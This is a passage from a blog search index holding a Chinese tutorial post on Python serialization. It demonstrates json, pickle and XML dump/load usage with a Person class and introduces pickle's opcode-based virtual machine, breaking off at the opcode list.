<?xml version="1.0" encoding="utf-8"?>
<search>
  
  
  
  <entry>
    <title>python-序列化与反序列化</title>
    <link href="/2024/09/13/python%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/"/>
    <url>/2024/09/13/python%E5%BA%8F%E5%88%97%E5%8C%96%E4%B8%8E%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/</url>
    
    <content type="html"><![CDATA[<p>发现大牛phith0n师傅：<a href="https://www.leavesongs.com/">phith0n师傅主页</a>、<a href="https://github.com/phith0n?tab=repositories">phith0n师傅github</a></p><h1 id="python-序列化与反序列化"><a href="#python-序列化与反序列化" class="headerlink" title="python-序列化与反序列化"></a>python-序列化与反序列化</h1><h2 id="序列化与反序列化"><a href="#序列化与反序列化" class="headerlink" title="序列化与反序列化"></a>序列化与反序列化</h2><h3 id="什么是？为什么需要？"><a href="#什么是？为什么需要？" class="headerlink" title="什么是？为什么需要？"></a>什么是？为什么需要？</h3><ul><li>首先再次明确什么是序列化与反序列化：</li></ul><p>序列化：将内存中的<code>不可持久化和传输</code>的对象转换为<code>可方便持久化和传输</code>的对象的过程。</p><p>反序列化：序列化的逆过程，将<code>可持久化和传输</code>的对象转换为<code>不可持久化和传输</code>的对象的过程。</p><ul><li>在<strong>python</strong>中：</li></ul><p>序列化可以理解为：<strong>把python对象编码转换为json格式的字符串</strong>。</p><p>反序列化可以理解为：<strong>把json格式字符串解码为python数据对象</strong>。</p><ul><li>编程为什么需要序列化与反序列化</li></ul><p>应用场景：</p><blockquote><p><strong>数据交换</strong>：不同应用程序需要共享数据时，由于所处计算机、操作系统或编程语言的不同，序列化数据使得跨越这些边界成为可能。</p><p><strong>数据存储</strong>：序列化数据可以有效地保存在文件、数据库或其它持久性存储介质中，以备将来使用。</p><p><strong>跨语言通信</strong>：若系统需要与其它编程语言编写的组件进行通信，序列化和反序列化是一种跨语言通信的通用方式。</p><p><strong>远程调用</strong>：在分布式系统中。远程调用需要将数据从客户端传输到服务器，并在服务器上执行操作，序列化和反序列化允许这种通信。</p></blockquote><h3 id="可序列化的对象"><a href="#可序列化的对象" class="headerlink" title="可序列化的对象"></a>可序列化的对象</h3><ul><li><p><code>None</code>、<code>True</code>和<code>False</code></p></li><li><p>整数、浮点数、复数</p></li><li><p>str、byte、bytearray</p></li><li><p>只包含可封存对象的集合，包括 tuple、list、set 和 dict</p></li><li><p>定义在模块最外层的函数（使用 def 定义，lambda 函数则不可以）</p></li><li><p>定义在模块最外层的内置函数</p></li><li><p>定义在模块最外层的类</p></li><li><p><code>__dict__</code>属性值 或 类的实例，其调用了<code>__getstate__()</code>的结果</p><p>（<code>__getstate__()</code>，重写该方法能帮助类class更深入地影响它们的实例被序列化的过程，具体可以参考官方文档<a href="https://docs.python.org/3/library/pickle.html%E7%9A%84%E8%AF%B4%E6%98%8E%EF%BC%89">https://docs.python.org/3/library/pickle.html的说明）</a></p></li></ul><h2 id="常见的数据序列化格式"><a href="#常见的数据序列化格式" class="headerlink" title="常见的数据序列化格式"></a>常见的数据序列化格式</h2><h3 id="JSON"><a href="#JSON" class="headerlink" title="JSON"></a>JSON</h3><p>Json，JavaScript Object Notation（js对象简谱），是一种轻量级的数据交换格式。采用<strong>完全独立于编程语言的文本格式</strong>来存储和表示数据。简洁和清晰的层次结构使得Json成为理想的数据交换语言。</p><ul><li><strong>为什么使用Json？</strong></li></ul><p>· 如果要在不同的编程语言之间传递对象，就必须把对象序列化为标准格式，比如XML，但更好的方法是序列化为Json。</p><p>· 因为Json表示出来的就是一个字符串，可以被所有语言读取，也可以方便地存储到磁盘或者通过网络传输。</p><p>· 而且Json不仅是标准格式，而且它比XML更快，可以直接在web页面中读取，很方便。</p><p>· Json在web api、配置文件、日志记录等方面有广泛应用。</p><ul><li><strong>Json的两种结构</strong></li></ul><p><strong>”名称&#x2F;值“对的集合</strong></p><p>不同编程语言中，它被理解为对象Object、记录Record、结构struct、字典dictionary、哈希表hash table、有键列表keyed list、关联数组associative array、等等。</p><p><strong>值的有序列表</strong></p><p>在大部分语言中，它被实现为数组array、矢量vector、列表list、序列sequence</p><ul><li><strong>Json的形式</strong></li></ul><p>有五种格式：值value、字符串string、数值number、对象object、数组array</p><p>其中：</p><p>· Json的数值没有使用八进制与十六进制格式哦</p><p>· 对象object由左右括号组成，其中名称和值之间通过冒号相连，名称&#x2F;值对之间使用逗号分隔。</p><p>Json的格式转换表如下：</p><p>json表示的对象就是标准的javascript对象，json和python内置的数据类型对应如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240911145440350.png" alt="image-20240911145440350"></p><h3 id="XML"><a href="#XML" class="headerlink" title="XML"></a>XML</h3><p>xml是一种可扩展的标记语言，用于存储和交换数据。它的结构具有层次性，允许表示复杂的数据结构。</p><p>在python中，有多个库用于处理xml数据，包括<strong>xml.etree.ElementTree</strong>和<strong>lxml</strong>。</p><ul><li>使用xml进行序列化和反序列化</li></ul><p>创建类对象使用了<strong>xml.etree.ElementTree</strong>的<strong>Element</strong>方法，传入类名的字符串形式。</p><p>创建类成员使用了<strong>xml.etree.ElementTree</strong>的<strong>SubElement</strong>方法，传入类对象以及成员名，类成员的值通过 <strong>text</strong> 参数定义。</p><p>序列化操作使用了<strong>xml.etree.ElementTree</strong>的<strong>tostring</strong>方法；</p><p>反序列化操作使用使用了<strong>xml.etree.ElementTree</strong>的<strong>fromstring</strong>方法；</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 自定义一个Person类</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, isMarried</span>):<br>        self.name = name<br>        self.age = age<br>        self.isMarried = isMarried<br><br><span class="hljs-comment"># 使用xml进行序列化和反序列化</span><br><span class="hljs-keyword">import</span> xml.etree.ElementTree <span class="hljs-keyword">as</span> ET<br><br>data = ET.Element(<span class="hljs-string">&#x27;person&#x27;</span>)<br><span class="hljs-built_in">print</span>(data)  <span class="hljs-comment"># &lt;Element &#x27;person&#x27; at 0x00000268A35F3330&gt;</span><br>name = ET.SubElement(data, <span class="hljs-string">&#x27;name&#x27;</span>)<br>name.text = <span class="hljs-string">&#x27;Alice&#x27;</span><br>age = ET.SubElement(data, <span class="hljs-string">&#x27;age&#x27;</span>)<br>age.text = <span class="hljs-string">&#x27;30&#x27;</span><br>isMarried = ET.SubElement(data, <span class="hljs-string">&#x27;isMarried&#x27;</span>)<br>isMarried.text = <span class="hljs-string">&#x27;False&#x27;</span><br><br>xml_string = ET.tostring(data, encoding=<span class="hljs-string">&#x27;utf-8&#x27;</span>).decode(<span class="hljs-string">&#x27;utf-8&#x27;</span>)   <span class="hljs-comment"># 将xml元素序列化为字符串</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(xml_string))  <span class="hljs-comment"># &lt;class &#x27;str&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(xml_string)  <span class="hljs-comment"># &lt;person&gt;&lt;name&gt;Alice&lt;/name&gt;&lt;age&gt;30&lt;/age&gt;&lt;isMarried&gt;False&lt;/isMarried&gt;&lt;/person&gt;</span><br><br>root = ET.fromstring(xml_string)  <span class="hljs-comment"># 将xml字符串反序列化为xml元素</span><br><span class="hljs-built_in">print</span>(root)  <span class="hljs-comment"># &lt;Element &#x27;person&#x27; at 0x00000268A35900E0&gt;</span><br></code></pre></td></tr></table></figure><h2 id="python中的序列化与反序列化"><a href="#python中的序列化与反序列化" class="headerlink" title="python中的序列化与反序列化"></a>python中的序列化与反序列化</h2><p>python中提供 <strong>pickle</strong> 和 <strong>json</strong> 两个模块来实现序列化与反序列化。</p><p>当然，系统来说，python提供的反序列化的库主要有pickle和cpickle两个，cpickle是python2.x使用的模块，pickle是python3.x使用的模块，在python3.x中取消了cpickle模块。具体参考<a href="https://zhuanlan.zhihu.com/p/668171160">pickle和cPickle模块的区别</a></p><p>pickle和json这两个模块均提供了**dump()、dumps()、load()、loads()**这四个函数，dump和dumps用于实现序列化，load和loads用于实现反序列化。</p><ul><li>资料</li></ul><p><a href="https://www.cnblogs.com/chenhuabin/p/10502096.html">Python开发之序列化与反序列化：pickle、json模块使用详解 </a></p><p><a href="https://segmentfault.com/a/1190000044385937">Python数据序列化与反序列化：高效数据交换与存储</a></p><p><a href="https://zhuanlan.zhihu.com/p/650287978">35.Python编程：序列化和反序列化</a></p><p><a href="https://blog.csdn.net/Hardworking666/article/details/112725423">Python序列化与反序列化详解（包括json和json模块详解）</a></p><p><a href="https://blog.csdn.net/qq_57143062/article/details/141560949">Python序列化与反序列化：pickle库使用详解</a></p><h3 id="pickle模块"><a href="#pickle模块" class="headerlink" title="pickle模块"></a>pickle模块</h3><blockquote><p>pickle实际上可以看作一种独立的语言，通过对opcode的更改编写可以执行python代码、覆盖变量等操作。</p><p>直接编写的opcode灵活性比使用pickle序列化生成的代码更高，有的代码不能通过pickle序列化得到。</p><p>pickle解析能力大于pickle生成能力。</p></blockquote><p>pickle模块中dump()、dumps()、load()、loads()按功能可划分为两组：</p><p>序列化：dump()、dumps()</p><p>反序列化：load()、loads()</p><p>· dump()和dumps()的区别是：</p><blockquote><p>dumps()只是单纯地将对象序列化，得到结果</p><p>​dumps(Object)</p><p>而dump()会在序列化之后将结果写入到文件当中</p><p>​dump(Object, file Object)</p></blockquote><p>· 与之对应，load()和loads()的区别是：</p><blockquote><p>load()会从文件中读取内容进行反序列化</p><p>​load(file Object)</p><p>而loads()是对dumps()的序列化结果进行反序列化</p><p>​loads(Serializable Object)</p></blockquote><p><strong>也就是一个需要结果文件作为中介，另一个不需要</strong>。</p><ul><li>实操</li></ul><p>根据上述函数的功能，常将<strong>loads和dumps</strong>、<strong>load和dump</strong>各自分为一组使用。</p><p>对于<strong>load和dump</strong>，由于涉及文件的写入和读取，而<strong>pickle</strong>写入的是<strong>二进制数据</strong>，所以打开和读取方式需要使用 <strong>wb</strong> 和 <strong>rb</strong> 。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> pickle<br><br><span class="hljs-comment"># dumps和loads</span><br><br>p_dict = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;isMarried&#x27;</span>: <span class="hljs-literal">False</span>&#125;<br>p_str = pickle.dumps(p_dict)  <span class="hljs-comment"># 序列化</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p_dict))  <span class="hljs-comment"># &lt;class &#x27;dict&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p_str))  <span class="hljs-comment"># &lt;class &#x27;bytes&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(p_str)  <span class="hljs-comment">#  b&#x27;\x80\x04\x95*\x00\x00\x00\x00\x00\x00\x00&#125;\x94(\x8c\x04name\x94\x8c\x06\xe5\xbc\xa0\xe4\xb8\x89\x94\x8c\x03age\x94K\x1e\x8c\tisMarried\x94\x89u.&#x27;</span><br><br>p = pickle.loads(p_str)  <span class="hljs-comment"># 反序列化</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p))  <span class="hljs-comment"># &lt;class &#x27;dict&#x27;&gt;</span><br><span class="hljs-built_in">print</span>(p)  <span class="hljs-comment"># &#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;age&#x27;: 30, &#x27;isMarried&#x27;: False&#125;</span><br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(p) == <span class="hljs-built_in">id</span>(p_dict))  <span class="hljs-comment"># 检查目标在序列化和反序列化前后是否为同一对象，结果为false，尽管他们的值相同，但是前后已经不是同一个对象了</span><br><br><br><span class="hljs-comment"># dump和load</span><br><br><span class="hljs-comment"># p_dict = &#123;&#x27;name&#x27;: &#x27;张三&#x27;, &#x27;age&#x27;: 30, &#x27;isMarried&#x27;: False&#125;</span><br><span class="hljs-comment"># 序列化</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;my_dump.txt&quot;</span>, <span class="hljs-string">&quot;wb&quot;</span>)  <span class="hljs-comment"># 序列化结果只有bites类型，所以必须以wb模式打开</span><br>pickle.dump(p_dict, file)<br>file.close()<br><br><span class="hljs-comment"># 反序列化</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;my_dump.txt&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>)<br>p = pickle.load(file)<br>file.close()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p))<br><span class="hljs-built_in">print</span>(p)  <span class="hljs-comment"># 可以看到，操作前后成功还原了p_dict对象数据。即反序列化之后得到的内容和序列化之前的内容完全一样。序列化之后的内容可以方便地保存至磁盘中，电脑关机也不怕了</span><br></code></pre></td></tr></table></figure><h3 id="Json模块"><a href="#Json模块" class="headerlink" title="Json模块"></a>Json模块</h3><p>Json模块也提供了和pickle模块一样的dump()、dumps()、load()、loads()四个函数，且函数之间的区别与pickle的区别也是一样的。</p><ul><li>实操</li></ul><p>为了应对json中dump和load涉及文件内容的乱码问题，可以<code>将dump和dumps的参数ensure_ascii的值设置为False</code>，如此即能解决json序列化后中文乱码的问题。</p><p>同样分为dump和load、dumps和loads两组：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># json dumps和loads</span><br><span class="hljs-keyword">import</span> json<br>p_dict = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;isMarried&#x27;</span>: <span class="hljs-literal">False</span>&#125;<br><span class="hljs-comment"># 序列化</span><br>p_str = json.dumps(p_dict)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p_str))<br><span class="hljs-built_in">print</span>(p_str)   <span class="hljs-comment"># 结果显示，序列化之后得到结果是字符串，但是原中文部分显示为了乱码</span><br><span class="hljs-comment"># 解决方案是使用dumps和dump函数中的ensure_ascii参数，将其值设置为False，可以令序列化后的中文依然正常显示</span><br>p_str2 = json.dumps(p_dict, ensure_ascii=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(p_str2)  <span class="hljs-comment"># &#123;&quot;name&quot;: &quot;张三&quot;, &quot;age&quot;: 30, &quot;isMarried&quot;: false&#125;</span><br><br><span class="hljs-comment"># 反序列化</span><br>p1 = json.loads(p_str)<br><span class="hljs-built_in">print</span>(p1)<br>p2 = json.loads(p_str)<br><span class="hljs-built_in">print</span>(p2)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">id</span>(p1) == <span class="hljs-built_in">id</span>(p2))  <span class="hljs-comment"># 尽管多次反序列化得到的结果一样，但是他们本质上并不是同一对象</span><br><br><br><span class="hljs-comment"># json dump和load</span><br><span class="hljs-keyword">import</span> json<br>p_dict = &#123;<span class="hljs-string">&#x27;name&#x27;</span>: <span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-string">&#x27;age&#x27;</span>: <span class="hljs-number">30</span>, <span class="hljs-string">&#x27;isMarried&#x27;</span>: <span class="hljs-literal">False</span>&#125;<br><span class="hljs-comment"># 序列化</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;json_dump.txt&quot;</span>, <span class="hljs-string">&#x27;w&#x27;</span>)<br>json.dump(p_dict, file, ensure_ascii=<span class="hljs-literal">False</span>)<br>file.close()<br><br><span class="hljs-comment"># 反序列化</span><br>file = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;json_dump.txt&quot;</span>, <span class="hljs-string">&#x27;r&#x27;</span>)<br>p = json.load(file)<br>file.close()<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p))<br><span class="hljs-built_in">print</span>(p)<br></code></pre></td></tr></table></figure><p>我们发现这里使用json进行反序列化的时候，反序列化的文件中都是只有一行字符串数据。</p><p>如果其中有多行数据，也就是其中有多个json数值，那应该怎么处理呢？</p><p>首先先要明确哦，json的dump和dumps序列化得到的都是json格式的字符串，也就是json数值。</p><ul><li>逐行读取json文件，进行反序列化</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(json_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br><span class="hljs-keyword">for</span> line <span class="hljs-keyword">in</span> f.readlines():<br>        line = line.strip()    <span class="hljs-comment"># 去除空行</span><br>        <span class="hljs-keyword">if</span> <span class="hljs-built_in">len</span>(line) != <span class="hljs-number">0</span>:<br>            json_data = json.loads(line)<br></code></pre></td></tr></table></figure><ul><li>将json文件中的多个json数值合并为一个json对象</li></ul><p>这个方法需要手动操作，即将各个json数值，使用中括号括起来，之间使用逗号分隔，然后构造json对象：{“dict”: [ ]}。接着就可以使用如下代码进行处理：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(json_path, <span class="hljs-string">&#x27;r&#x27;</span>) <span class="hljs-keyword">as</span> f:<br>    json_data = json.loads(f.read())<br></code></pre></td></tr></table></figure><h3 id="区别"><a href="#区别" class="headerlink" title="区别"></a>区别</h3><p>所以，Json模块和pickle模块的区别在于以下几点：</p><blockquote><p>（1）</p><p>pickle模块用于python语言特有的类型和用户自定义类型与python基本数据类型之间的转换</p><p>Json模块用于字符串和python数据类型间进行转换</p><p>（2）</p><p>pickle序列化的结果为bites类型，只适合于python机器之间的交互</p><p>Json序列化结果为str类型，能够被多种语言识别，可用于与其它程序设计语言交互</p><p>（3）</p><p>pickle能够表示python几乎所有的类型（包括自定义类型）</p><p>Json只能表示一部分内置类型且不能表示自定义类型</p></blockquote><ul><li>实操</li></ul><p>自定义一个Person类：姓名、年龄、是否已婚</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">class</span> <span class="hljs-title class_">Person</span>:<br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self, name, age, isMarried</span>):<br>        self.name = name<br>        self.age = age<br>        self.isMarried = isMarried<br></code></pre></td></tr></table></figure><blockquote><p>注意这里class类的定义：如果对其中的成员直接以 name &#x3D; value 的方式赋初值的话，那么这个自定义类是不会被打包的。需要写一个<code>__init__</code>方法，即如上，<code>def __init__(self, etc)</code></p></blockquote><p>实例化一个Person对象，尝试使用<strong>pickle</strong>模块对该实例化对象以及Person类本身进行序列化操作。经过实践可以知道<strong>pickle模块能够对类以及类实例对象进行序列化和反序列化</strong>。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 实例化Person对象</span><br>p = Person(<span class="hljs-string">&#x27;张三&#x27;</span>, <span class="hljs-number">30</span>, <span class="hljs-literal">False</span>)<br><br><span class="hljs-comment"># 使用pickle模块对Person对象进行序列化和反序列化</span><br><span class="hljs-keyword">import</span> pickle<br>pp = pickle.dumps(p)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(pp))<br><span class="hljs-built_in">print</span>(pp)<br>p2 = pickle.loads(pp)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p2))<br><span class="hljs-built_in">print</span>(p2.name)   <span class="hljs-comment"># 可以直接访问对象的键的值</span><br><br><span class="hljs-comment"># 使用pickle对Person类本身进行序列化</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;使用pickle对Person类本身进行序列化&quot;</span>)<br>per = pickle.dumps(Person)<br><span class="hljs-built_in">print</span>(per)<br>per2 = pickle.loads(per)<br><span class="hljs-built_in">print</span>(per2)<br></code></pre></td></tr></table></figure><p>尝试使用<strong>json</strong>对Person实例化对象进行序列化，会发现其报错了，报错信息指出：Person对象不是json可序列化的。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240913171854479.png" alt="image-20240913171854479"></p><p>如果<strong>非得使用json</strong>对Person类对象进行序列化的话，那就必须<strong>先定义一个将Person对象转化为字典dict的方法</strong>：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># 定义将Person对象转换为字典dict的方法</span><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">person2dict</span>(<span class="hljs-params">per</span>):<br>    <span class="hljs-keyword">return</span> &#123;<br>        <span class="hljs-string">&#x27;name&#x27;</span>: per.name,<br>        <span class="hljs-string">&#x27;age&#x27;</span>: per.age,<br>        <span class="hljs-string">&#x27;isMarried&#x27;</span>: per.isMarried<br>    &#125;<br></code></pre></td></tr></table></figure><p>尝试使用json对其进行序列化。</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><code class="hljs python">p3 = json.dumps(p, default=person2dict)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p3))<br><span class="hljs-built_in">print</span>(p3)  <span class="hljs-comment"># 发现能成功序列化，但是中文部分是乱码，那就添加ensure_ascii=False参数</span><br>p3 = json.dumps(p, default=person2dict, ensure_ascii=<span class="hljs-literal">False</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p3))<br><span class="hljs-built_in">print</span>(p3)  <span class="hljs-comment"># 解决中文乱码问题</span><br></code></pre></td></tr></table></figure><p>注意到，这里使用dumps进行序列化的时候使用到了 <strong>default</strong> 参数指定了person2dict(per)转换方法。</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240913192823254.png" alt="image-20240913192823254"></p><p>对default参数的说明如下：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240913214433981.png" alt="image-20240913214433981"></p><blockquote><p>default(obj) 这个参数简单的解决了类型错误的问题。应该能返回obj对象的可被序列化版本或者引发TypeError，进而执行dumps序列化操作。</p></blockquote><p>既然使用json对Person对象进行序列化不能直接进行，需要编写一个类型转换方法，那么使用json进行反序列化的时候也不能直接对json 序列化的结果进行操作。若直接对json 序列化结果进行反序列化，结果会得到一个dict对象，而不是我们想要的Person对象。</p><p>所以需要先编写一个由dict对象转换为Person对象的功能方法：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">def</span> <span class="hljs-title function_">dict2Person</span>(<span class="hljs-params">d</span>):<br>    <span class="hljs-keyword">return</span> Person(d[<span class="hljs-string">&#x27;name&#x27;</span>], d[<span class="hljs-string">&#x27;age&#x27;</span>], d[<span class="hljs-string">&#x27;isMarried&#x27;</span>])<br></code></pre></td></tr></table></figure><p>然后进行反序列化操作：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">p5 = json.loads(p3, object_hook=dict2Person)<br><span class="hljs-built_in">print</span>(<span class="hljs-built_in">type</span>(p5))<br><span class="hljs-built_in">print</span>(p5.name)<br></code></pre></td></tr></table></figure><p>可以发现，在进行loads反序列化的时候，使用了 <strong>object_hook</strong> 参数承接了外部自定义的dict2Person(d)方法。</p><p>同样追溯到loads函数的声明处查看：</p><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240913220237278.png" alt="image-20240913220237278"></p><blockquote><p>object_hool，是一个可选的功能，能对任何类型的返回结果进行再解码，可以理解为强制转换。也就是说，传入的方法函数用于处理loads原本的返回值，并最后作为loads的返回值赋值给左边的变量。</p></blockquote><p>但要是我们每次遇到一个类，且json无法对该类以及类对象直接进行序列化的时候，我们都要分别写一个转换函数来实现序列化和反序列化操作吗？</p><p>这样的编程思路是繁琐的且浪费时间的。有什么方法呢？</p><p>答：<strong>可以通过default参数构造，把任意类的实例对象变为dict</strong></p><blockquote><p><code>json.dumps(class obj, default=lambda obj: obj.__dict__)</code></p></blockquote><p><img src="https://cdn.jsdelivr.net/gh/haoisbinlove/Blogimage@main/image/image-20240914103831775.png" alt="image-20240914103831775"></p><h3 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h3><p>1、pickle序列化的结果为bites类型，只适合于Python机器之间的交互。</p><p>2、json序列化结果为str类型，能够被多种语言识别，可用于与其它程序设计语言交互。</p><p>3、目前，json格式字符串已经成为网络传输中的一种标准格式，所以再web开发后台开发中通常使用json模块来序列化而不是pickle模块。</p><p>4、对pickle进行一些补充：</p><p>pickle库为python对象提供了一种方便的持久化方式。通过pickle可以轻松地存储任何复杂的python对象，并在之后重新加载它们。但是pickle并不适用于所有对象，某些对象可能无法被序列化，或者在反序列化时会丢失一些信息。</p><p>因此，处于安全考虑，最好不要从不可信的源加载pickle数据，因为反序列化过程可能会执行不安全的代码。</p><h2 id="pickle过程详解"><a href="#pickle过程详解" class="headerlink" title="pickle过程详解"></a>pickle过程详解</h2><ul><li>pickle 解析依靠 Pickle Virtual Machine（PVM）进行</li><li>PVM 涉及到三个部分：解析引擎、栈、内存</li></ul><blockquote><p>解析引擎：从流中读取 opcode 和参数，并对其进行解释处理，重复这个动作，直到遇到的<code>.</code>停止。最终停留在栈顶的值将会被当作反序列化对象返回。</p><p>栈：由python的<code>list</code>实现，被用来临时存储数据、参数以及对象</p><p>memo：由python的dict实现，为PVM的生命周期提供存储。通俗理解就是将反序列化完成的数据以<code>key-value</code>的形式储存在memo中，以便后来使用。</p></blockquote><p>问题来了，什么是memo？</p><p>答：</p><p>在pickle模块中，memo主要用于管理和复用在序列化过程中创建的对象，帮助确保在反序列化时能够正确重建对象图。</p><p><strong>pickle过程</strong>的详细解读参考资料：<a href="https://xz.aliyun.com/t/7436?time__1311=n4+xnD0Dy7GQDt=G=GCDlhjecQhiWeWNHe4D">pickle反序列化初探</a></p><h3 id="opcode（操作码）"><a href="#opcode（操作码）" class="headerlink" title="opcode（操作码）"></a>opcode（操作码）</h3><p>在python的pickle模块中，<strong>操作码 opcode</strong> 是<strong>用于表示不同操作或数据结构的指令</strong>。</p><p>这些opcode是pickle格式的一部分，它们定义了如何将python对象序列化为字节流，或如何从字节流中反序列化这些对象。</p><blockquote><p>常见的操作码有：更详细的操作码列表参考<a 